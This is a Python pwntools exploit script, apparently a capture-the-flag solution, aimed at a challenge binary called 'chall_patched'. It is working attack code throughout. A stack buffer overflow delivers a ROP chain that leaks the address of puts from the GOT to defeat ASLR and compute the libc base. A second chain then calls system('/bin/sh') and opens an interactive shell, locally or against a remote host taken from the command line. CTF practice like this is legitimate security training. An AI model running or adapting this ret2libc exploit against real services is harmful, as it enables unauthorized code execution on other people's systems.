from pwn import *
import sys
from Crypto.Util.number import bytes_to_long

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

libc = ELF("./libc.so.6", checksec=False)


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendline(content)


x, p = init()

v6_buff = 1032
pad = 8
done_len = 4
pad = (v6_buff + pad) - 4
pad = b"A"*pad

x.debug((
    # "break *main+143\nc"
    "break *main+287\nc"
))


def leak_puts_got():
    r = ROP(exe)
    r.call(exe.plt['puts'], [exe.got['puts']])
    r.raw(exe.sym['main'])

    pay = pad
    pay += flat(r)
    pay += b"\ndone"
    x.send(pay)
    p.recvuntil(b"/dev/null\n")
    puts_addr = p.recvline()[:-1][::-1]
    return bytes_to_long(puts_addr)


puts_addr = leak_puts_got()
libc.address = puts_addr - libc.sym['puts']
log.info(f"puts @ 0x{puts_addr:x}")
log.info(f"libc @ 0x{libc.address:x}")

r = ROP(libc)
r.raw(r.find_gadget(['ret']))
r.call(libc.sym['system'], [libc.search(b"/bin/sh").__next__()])

pay = pad
pay += flat(r)
pay += b"\ndone"
x.send(pay)

p.interactive()
